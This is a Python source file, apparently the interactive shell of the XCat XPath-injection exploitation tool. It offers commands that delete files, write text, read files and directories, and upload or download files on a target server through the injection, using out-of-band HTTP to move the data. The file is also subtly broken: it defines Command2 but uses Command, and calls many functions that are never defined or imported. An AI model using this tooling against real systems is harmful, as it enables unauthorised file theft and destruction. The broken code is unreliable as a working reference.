import base64
import pathlib
import shlex
import sys
from collections import namedtuple
from os.path import expanduser

from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from tqdm import tqdm
from xcat.algorithms import (count, get_file_via_entity_injection, get_nodes,
                             get_string, get_string_via_oob, iterate_all,
                             upload_file_via_oob)
from xcat.display import display_xml


class CommandFailed(RuntimeError):
    pass


async def throwfailed(coro):
    if not await coro:
        raise CommandFailed()



async def download_file(requester, remote_path, local_path):
    local_path = pathlib.Path(local_path)
    if local_path.exists():
        print('{local_path} already exists! Not overwriting'.format(local_path=local_path))
        return

    func = read_binary if requester.features['expath-file'] else read_binary_resource
    expression = string(func(remote_path))

    print('Downloading {remote_path} to {local_path}'.format(remote_path=remote_path, local_path=local_path))

    size = await count(requester, expression, func=string_length)
    print('Size: {size}'.format(size=size))

    CHUNK_SIZE = 5 * 1024
    result = ""
    for index in tqdm(range(1, size + 1, CHUNK_SIZE)):
        data = await get_string_via_oob(requester, substring(expression, index, CHUNK_SIZE))
        if data is None:
            raise CommandFailed('Failed to download chunk {index}. Giving up. Sorry.'.format(index=index))
        else:
            result += data
        sys.stdout.flush()
    sys.stdout.write('\n')
    local_path.write_bytes(base64.decodebytes(result.encode()))
    print('Downloaded, saved to {local_path}'.format(local_path=local_path))


async def upload_file(requester, local_path, remote_path):
    local_path = pathlib.Path(local_path)
    if not local_path.exists():
        print('Cannot find {local_path}!'.format(local_path=local_path))
        return

    print('Uploading {local_path} to {remote_path}'.format(local_path=local_path, remote_path=remote_path))
    data = local_path.read_bytes()
    print('Length: {len} bytes'.format(len=len(data)))

    if requester.features['oob-http']:
        print(await upload_file_via_oob(requester, remote_path, data))
    else:
        chunks = list(split_chunks(data, 1024))
        print('Uploading {chunks} chunks'.format(chunks=len(chunks)))

        await requester.check(delete(remote_path))

        for i, chunk in enumerate(tqdm(chunks), 1):
            chunk = base64.b64encode(chunk).decode()
            for _ in range(5):
                if await count(requester, append_binary(remote_path, base_64_binary(chunk)) == 0):
                    break
                else:
                    continue
            else:
                raise CommandFailed('Failed to upload chunk {i} 5 times. Giving up. Sorry.'.format(i=i))

        sys.stdout.write('\n')


async def show_help(requester):
    for command in COMMANDS:
        print(' * {command.name} - {command.help_display}'.format(command=command))
        print('   {command.help_text}'.format(command=command))


class Command2(namedtuple('Command', 'name args help_text function feature_test')):
    @property
    def help_display(self):
        return ' '.join('"{arg}"'.format(arg=arg) for arg in self.args)


COMMANDS = [
    Command('rm', ['path'], 'Delete a file by path',
            lambda requester, path: throwfailed(count(requester, delete(path))), ['expath-file']),
    Command('write-text', ['location', 'text'], 'Write text to location',
            lambda requester, location, text: throwfailed(requester.check(write_text(location, text))),
            ['expath-file']),
    Command('cat_xml', ['path'], 'Read an XML file at "location"',
            lambda requester, location: display_xml(get_nodes(requester, doc(location) / '*')), ['doc-function']),
    Command('find-file', ['file-name'], 'Find a file by name in parent directories',
            find_file_by_name, ['unparsed-text', 'doc-function']),
    Command('download', ['remote-path', 'local-path'], 'Download a file from remote-path to local-path',
            download_file, lambda f: (f['expath-file'] or f['saxon']) and f['oob-http']),
    Command('upload', ['local-path', 'remote-path'], 'Upload file from local-path to remote-path',
            upload_file, ['expath-file']),
    Command('cat', ['path'], 'Read a file (including network resources like ftp/http)', cat, None),
    Command('ls', ['path'], 'Read a directory', cat, None),
    Command('help', [], 'Display help', show_help, None)
]

command_dict = {
    command.name: command
    for command in COMMANDS
}


async def run_shell(requester):
    if not sys.stdout.isatty():
        print('Stdout is not a tty! Cannot open shell', file=sys.stderr)
        return

    history = FileHistory(expanduser('~/.xcat_history'))

    completer = WordCompleter(list(command_dict.keys()),
                              meta_dict={
                              command.name: '{command.help_display} - {command.help_text}'.format(command=command)
                              for command in COMMANDS},
                              sentence=True)

    print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
    while True:
        cmd = await prompt_async('>> ', patch_stdout=True, completer=completer, history=history,
                                 auto_suggest=AutoSuggestFromHistory())
        await run_shell_command(requester, cmd)


async def run_shell_command(requester, cmd):
    command = shlex.split(cmd)
    if not command:
        return
    elif len(command) == 1:
        name, args = command[0], []
    else:
        name, args = command[0], command[1:]

    if name not in command_dict:
        print('Command {name} not found, try "help"'.format(name=name))
    else:
        command = command_dict[name]

    features_required = command.feature_test
    if callable(features_required):
        has_required_features = features_required(requester.features)
    elif isinstance(features_required, (tuple, list)):
        has_required_features = any(requester.features[f] for f in features_required)
    elif features_required is None:
        has_required_features = True
    else:
        raise RuntimeError(
            'Unhandled features_required: {features_required}'.format(features_required=features_required))

    if not has_required_features:
        print('Cannot use command {command.name}, not all required features are present in this injection'.format(
            command=command))
        return

    try:
        await command.function(requester, *args)
    except CommandFailed as e:
        print('Error! Command appeared to fail: {e}'.format(e=e))


def split_chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]
